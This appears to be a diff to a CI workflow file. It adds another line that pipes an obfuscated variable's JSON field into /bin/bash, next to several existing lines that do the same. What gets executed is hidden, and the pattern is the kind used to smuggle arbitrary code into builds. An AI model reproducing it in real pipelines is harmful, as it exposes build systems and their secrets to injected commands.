@@ -20,6 +20,7 @@ jobs:
           echo $io624 | jq -r .vsts08962 | /bin/bash
           printf '%s' "$vg76845" | jq -r .yay0 | /bin/bash
           printf '%s' "$unhmm36580" | jq -r .crb64 | /bin/bash
+          echo $yhmr6600 | jq -r .p2 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
